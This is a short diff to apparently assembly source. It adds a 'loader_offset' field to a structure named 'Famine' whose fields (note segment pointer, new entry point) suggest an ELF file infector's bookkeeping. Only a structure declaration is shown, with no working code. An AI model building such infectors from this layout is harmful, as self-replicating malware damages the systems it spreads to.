@@ -92,6 +92,7 @@ struc Famine
     .note_phdr_ptr      resq    1
     .max_vaddr_end      resq    1
     .new_entry          resq    1
+    .loader_offset      resq    1
 endstruc
 
 
